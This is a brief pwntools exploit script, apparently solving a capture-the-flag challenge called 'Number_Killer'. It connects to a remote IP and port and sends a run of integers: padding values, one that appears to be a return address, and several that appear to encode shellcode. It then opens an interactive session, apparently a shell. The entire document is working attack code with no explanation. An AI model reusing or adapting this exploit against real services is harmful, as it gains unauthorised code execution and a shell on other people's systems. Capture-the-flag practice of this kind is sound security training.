from pwn import*
import time
context.log_level = 'debug'
context(arch = 'amd64', os = 'linux')
cn=remote('47.103.214.163',20001)
#cn=process('./Number_Killer')
print cn.recv()
for i in range(1,14):
 cn.sendline('47244640256')
 sleep(0.1)
cn.sendline('4196237')
sleep(0.1)
cn.sendline('7074926021049463112')
sleep(0.1)
cn.sendline('-1458805190845043095')
sleep(0.1)
cn.sendline('5212724049075524360')
sleep(0.1)
cn.sendline('5562984097417')
cn.interactive()
